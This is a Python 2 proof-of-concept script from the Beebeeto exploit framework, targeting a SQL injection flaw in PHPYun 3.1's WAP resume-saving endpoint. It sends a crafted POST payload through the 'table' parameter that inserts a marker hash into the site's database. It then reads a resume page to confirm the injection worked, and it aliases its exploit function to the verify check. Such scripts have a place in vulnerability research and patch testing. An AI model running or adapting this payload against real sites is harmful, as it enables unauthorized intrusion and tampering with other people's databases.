#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2


from baseframe import BaseFrame
from utils.http.forgeheaders import ForgeHeaders


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0012',
            'name': 'PHPYun 3.1 /wap/member/model/index.class.php SQL注入漏洞 POC',
            'author': 'tmp',
            'create_date': '2015-01-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPYun',
            'vul_version': ['3.1'],
            'type': 'SQL Injection',
            'tag': ['PHPYun漏洞', '/wap/member/model/index.class.php', 'php'],
            'desc': '/wap/member/model/index.class.php 过滤不严谨',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-071296',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        fake_headers = ForgeHeaders().get_headers()
        fake_headers['User-Agent'] = "iPhone6"
        check_url = '%s/index.php?m=resume&id=999999' % args['options']['target']
        verify_url = '%s/wap/member/index.php?m=index&c=saveresume' % args['options']['target']
        data = 'table=expect%60%20%28id%2Cuid%2Cname%29%20values%20%28' \
               '999999%2C1%2C%28md5%280x23333333%29%29%29%23&subm' \
               'it=111&eid=1'
        req = urllib2.Request(verify_url, data=data, headers=fake_headers)
        urllib2.urlopen(req)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(check_url).read()
        if '2eb120797101bb291fd4a6764' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['post_data'] = data
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())